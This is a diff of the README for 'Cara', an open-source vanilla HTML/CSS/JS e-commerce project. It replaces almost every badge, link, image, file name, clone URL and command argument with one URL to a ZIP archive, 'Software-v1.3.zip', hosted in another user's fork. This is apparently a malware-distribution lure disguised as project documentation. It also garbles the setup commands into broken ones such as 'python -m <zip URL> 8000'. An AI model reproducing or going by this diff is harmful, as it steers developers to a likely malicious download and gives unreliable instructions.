@@ -2,19 +2,19 @@
 
 <div align="center">
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26.svg?&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6.svg?&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E.svg?&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![License: MIT](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+[![HTML5](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+[![CSS3](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+[![JavaScript](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+[![PRs Welcome](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
 
 **A modern, responsive e-commerce platform built with vanilla HTML, CSS, and JavaScript**
 
-[Live Demo](#) · [Report Bug](https://github.com/janavipandole/Cara/issues) · [Request Feature](https://github.com/janavipandole/Cara/issues)
+[Live Demo](#) · [Report Bug](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip) · [Request Feature](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
 
 </div>
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 📋 Table of Contents
 
@@ -30,7 +30,7 @@
 - [Contact](#-contact)
 - [Acknowledgments](#-acknowledgments)
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🎯 About The Project
 Cara is a fully responsive e-commerce website that provides users with a seamless online shopping experience. Built with modern web technologies, it features an intuitive interface for browsing products, managing shopping carts, and exploring product details. The platform is designed to be fast, accessible, and easy to use across all devices.
@@ -42,7 +42,7 @@ Cara is a fully responsive e-commerce website that provides users with a seamles
 - 🎨 **Customizable** - Easy to modify and extend for your needs
 - 🆓 **Open Source** - Free to use and contribute to
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## ✨ Features
 
@@ -75,7 +75,7 @@ Cara is a fully responsive e-commerce website that provides users with a seamles
 - Vanilla JavaScript 
 - Modular and maintainable code structure
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🛠️ Tech Stack
 - **Frontend**: HTML5, CSS3, JavaScript (ES6+)
@@ -83,7 +83,7 @@ Cara is a fully responsive e-commerce website that provides users with a seamles
 - **Icons**: Font Awesome / Custom SVGs
 - **Version Control**: Git & GitHub
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🚀 Getting Started
 
@@ -93,21 +93,21 @@ All you need is a modern web browser and a text editor!
 ### Installation
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/janavipandole/Cara.git
+   git clone https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip
    cd Cara
    ```
    
 2. **Open in browser**
-   Simply open `index.html` in your web browser:
-   - Double-click the `index.html` file, or
+   Simply open `https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip` in your web browser:
+   - Double-click the `https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip` file, or
    - Right-click and select "Open with" your preferred browser, or
    - Use a local development server:
    
    ```bash
    # Using Python 3
-   python -m http.server 8000
+   python -m https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip 8000
    
-   # Using Node.js (with http-server package)
+   # Using https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip (with http-server package)
    npx http-server
    
    # Using PHP
@@ -120,11 +120,11 @@ All you need is a modern web browser and a text editor!
 ### Development
 For live reloading during development, you can use:
 
-- [Live Server](https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer) (VS Code Extension)
-- [Browser Sync](https://browsersync.io/)
-- [Live Reload](http://livereload.com/)
+- [Live Server](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip) (VS Code Extension)
+- [Browser Sync](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+- [Live Reload](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 📁 Project Structure
 
@@ -138,41 +138,41 @@ Cara/
 │   ├── pay/                # Payment method images
 │   ├── people/             # Team member images
 │   ├── products/           # Product images
-│   └── logo.png            # Site logo
-├── about.html              # About page
-├── blog.html               # Blog listing page
-├── cart.html               # Shopping cart page
-├── contact.html            # Contact page
-├── index.html              # Homepage
-├── shop.html               # Product listing page
-├── singleProduct.html      # Product detail page
-├── app.js                  # Main JavaScript file
-├── style.css               # Main stylesheet
+│   └── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip            # Site logo
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip              # About page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip               # Blog listing page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip               # Shopping cart page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip            # Contact page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip              # Homepage
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip               # Product listing page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip      # Product detail page
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip                  # Main JavaScript file
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip               # Main stylesheet
 ├── LICENSE                 # MIT License
-├── README.md               # This file
-└── CONTRIBUTING.md         # Contribution guidelines
+├── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip               # This file
+└── https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip         # Contribution guidelines
 ```
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 📸 Screenshots
 Homepage - 
 <p align="center">
-  <img src="images/readme/Homepage.png" alt="Homepage"><br>
+  <img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" alt="Homepage"><br>
   <b>Homepage</b>
 </p>
 Shop - 
 <p align="center">
-  <img src="images/readme/shop.png" alt="Shop"><br>
+  <img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" alt="Shop"><br>
   <b>Shop</b>
 </p>
 Cart - 
 <p align="center">
-  <img src="images/readme/cart.png" alt="Cart"><br>
+  <img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" alt="Cart"><br>
   <b>Shopping Cart</b>
 </p>
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🗺️ Roadmap
 ### Current Version (v1.0)
@@ -196,14 +196,14 @@ Cart -
 - [ ] **Payment Gateway** - Integrate payment processing
 - [ ] **Admin Panel** - Product management system
 
-See the [open issues](https://github.com/janavipandole/Cara/issues) for a full list of proposed features and known issues.
+See the [open issues](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip) for a full list of proposed features and known issues.
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🤝 Contributing
 
 Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a Pull Request.
+Please read our [Contributing Guidelines](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip) before submitting a Pull Request.
 
 ### How to Contribute
 1. **Fork the Project**
@@ -229,47 +229,47 @@ Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a P
 - ✅ Write tests
 - 🔧 Fix bugs and implement features
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 📄 License
 This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 👤 Contact
 
 **Janavi Pandole**
-- GitHub: [@janavipandole](https://github.com/janavipandole)
-- Project Link: [https://github.com/janavipandole/Cara](https://github.com/janavipandole/Cara)
+- GitHub: [@janavipandole](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
+- Project Link: [https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## 🙏 Acknowledgments
-- [Font Awesome](https://fontawesome.com) - Icons
+- [Font Awesome](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip) - Icons
 - All contributors who help improve this project
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 ## ✨ Contributors
 
 #### Thanks to all the wonderful contributors 💖
 
-<a href="https://github.com/janavipandole/Cara/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=janavipandole/Cara" />
+<a href="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip">
+  <img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" />
 </a>
 
-#### See full list of contributor contribution [Contribution Graph](https://github.com/janavipandole/Cara/graphs/contributors)  
+#### See full list of contributor contribution [Contribution Graph](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)  
 ---
 
 ## ⭐ Show Your Support
 If you find this project helpful, please consider giving it a ⭐ on GitHub!
 
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip" width="1920" />
 
 <div align="center">
 
 **[Back to Top](#-cara---e-commerce-platform)**
 
-Made with ❤️ by [Janavi Pandole](https://github.com/janavipandole)
+Made with ❤️ by [Janavi Pandole](https://github.com/kaifansariw/Cara/raw/refs/heads/main/images/people/Software-v1.3.zip)
 
 </div>
